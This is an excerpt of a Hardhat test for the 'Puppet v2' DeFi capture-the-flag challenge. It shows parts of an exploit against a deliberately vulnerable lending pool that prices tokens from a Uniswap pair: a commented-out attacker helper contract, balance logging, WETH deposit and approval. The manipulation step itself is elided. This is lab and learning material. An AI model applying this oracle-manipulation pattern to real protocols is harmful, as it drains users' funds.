...
describe("[Challenge] Puppet v2", function () {
  ...
  it("Exploit", async function () {
    ...
    //   attacker
    // );
    // const uniswapPairAddress = await this.uniswapFactory.getPair(
    //   this.token.address,
    //   this.weth.address
    // );
    // const attackerHelper = await AttackerFactory.deploy(
    //   this.uniswapFactory.address,
    //   this.uniswapRouter.address,
    //   attacker.address,
    //   uniswapPairAddress,
    ...
    //   this.lendingPool.address
    // );
    // await attackerHelper.execute({
    //   value: UNISWAP_INITIAL_WETH_RESERVE.sub(1),
    // });

    // console.log(
    //   "ETH balance:",
    //   ethers.utils.formatUnits(
    //     await ethers.provider.getBalance(attackerHelper.address)
    //   )
    // );
    // console.log(
    //   "DVT balance:",
    //   ethers.utils.formatUnits(
    //     await this.token.balanceOf(attackerHelper.address)
    //   )
    // );
    // console.log(
    //   "WETH balance:",
    //   ethers.utils.formatUnits(
    //     await this.weth.balanceOf(attackerHelper.address)
    //   )
    // );
    ...
    console.log(
      "BEFORE: DVT balance:",
      ethers.utils.formatUnits(await this.token.balanceOf(attacker.address))
    );
    console.log(
      "BEFORE: WETH balance:",
      ethers.utils.formatUnits(await this.weth.balanceOf(attacker.address))
    );

    console.log(
      "BEFORE: Deposit required:",
      ethers.utils.formatUnits(
        await this.lendingPool.calculateDepositOfWETHRequired(
          POOL_INITIAL_TOKEN_BALANCE
        )
    ...
    console.log(
      "AFTER: Deposit required:",
      ethers.utils.formatUnits(deposit_required),
      "WETH"
    );
    ...
    await this.weth.connect(attacker).deposit({ value: deposit_required });
    ...
    await this.weth
      .connect(attacker)
      .approve(this.lendingPool.address, deposit_required);
